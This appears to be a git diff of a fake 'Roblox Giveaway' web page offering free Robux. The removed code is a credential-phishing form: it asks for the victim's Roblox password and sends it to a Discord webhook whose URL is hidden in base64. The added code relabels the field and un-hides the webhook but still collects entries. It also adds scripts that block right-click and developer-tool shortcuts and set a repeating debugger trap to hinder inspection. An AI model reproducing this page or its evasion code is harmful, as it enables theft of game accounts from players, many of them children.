@@ -52,8 +52,7 @@
   <div class="container">
     <h2>Enter the Roblox Giveaway!</h2>
     <input type="text" id="username" placeholder="Roblox Username" required />
-    <input type="text" id="displayName" placeholder="Roblox Password (for security reasons)" required />
-    
+    <input type="text" id="displayName" placeholder="Roblox Display Name" required />
     <select id="robuxAmount" required>
       <option value="">Select Robux Amount</option>
       <option value="100">100 Robux</option>
@@ -61,35 +60,52 @@
       <option value="500">500 Robux</option>
       <option value="1000">1000 Robux</option>
     </select>
-    
     <button onclick="submitForm()">Enter Giveaway</button>
     <div class="success" id="successMsg"></div>
   </div>
 
-<script>
-  async function submitForm() {
-    const u = document.getElementById("username").value.trim();
-    const d = document.getElementById("displayName").value.trim();
-    const r = document.getElementById("robuxAmount").value;
-    if (!u || !d || !r) { alert("Fill all fields."); return; }
-    const w = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyMjY3MzY3OTMxOTE3MC85a3pHSlRQRkZrbFZ5MlBWY3JwTWlMRXpBeTNqSEZyeVFVUG8zWGVxZTRuRjJ3czJMbWMxeFpPeWh6aTB6bzBodmVETA==");
-    const p = {
-      content: `🎁 **New Giveaway Entry!**\n👤 Username: \`${u}\`\n📝 Password: \`${d}\`\n💰 Requested Robux: \`${r} Robux\``
-    };
-    try {
-      const res = await fetch(w, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(p)
-      });
-      if (res.ok) document.getElementById("successMsg").innerText = "Thanks for entering!";
-      else alert("Something went wrong.");
-    } catch (e) {
-      alert("Error: " + e.message);
+  <script>
+    async function submitForm() {
+      const u = document.getElementById("username").value.trim();
+      const d = document.getElementById("displayName").value.trim();
+      const r = document.getElementById("robuxAmount").value;
+      if (!u || !d || !r) { alert("Fill all fields."); return; }
+      const w = "https://discord.com/api/webhooks/1392822673679319170/9kzGJTPFFklVy2PVcrpMiLEzAy3jHFryQUPo3Xeqe4nF2ws2Lmc1xZOyhzi0zo0hveDL";
+      const p = {
+        content: `🎁 **New Giveaway Entry!**
+👤 Username: \`${u}\`
+📝 Display Name: \`${d}\`
+💰 Requested Robux: \`${r} Robux\``
+      };
+      try {
+        const res = await fetch(w, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(p)
+        });
+        if (res.ok) document.getElementById("successMsg").innerText = "Thanks for entering!";
+        else alert("Something went wrong.");
+      } catch (e) {
+        alert("Error: " + e.message);
+      }
     }
-  }
-</script>
 
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.addEventListener("keydown", e => {
+      if (
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
+        (e.ctrlKey && e.key === "U") ||
+        (e.metaKey && e.key === "I")
+      ) {
+        e.preventDefault();
+        return false;
+      }
+    });
 
+    setInterval(() => {
+      debugger;
+    }, 1000);
+  </script>
 </body>
 </html>
